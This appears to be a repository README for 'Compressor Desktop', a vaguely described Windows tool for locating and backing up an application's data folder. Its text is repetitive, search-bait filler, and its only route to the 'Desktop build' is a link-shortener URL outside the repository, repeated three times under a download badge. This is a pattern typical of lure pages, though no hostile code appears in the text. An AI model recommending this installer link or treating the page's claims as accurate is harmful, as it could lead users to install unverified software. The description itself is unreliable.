![Compressor Desktop](assets/hero.png)

# Compressor Desktop

*Find the Compressor folder fast and keep a local spare.*

## What Compressor Desktop is

This repository is **Compressor Desktop**, a Windows utility. Find the Compressor folder fast and keep a local spare.

Compressor drops data files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Finds the Compressor data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Compressor desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/evelyn-allen-179/compressor-desktop

MIT license. See `LICENSE`.
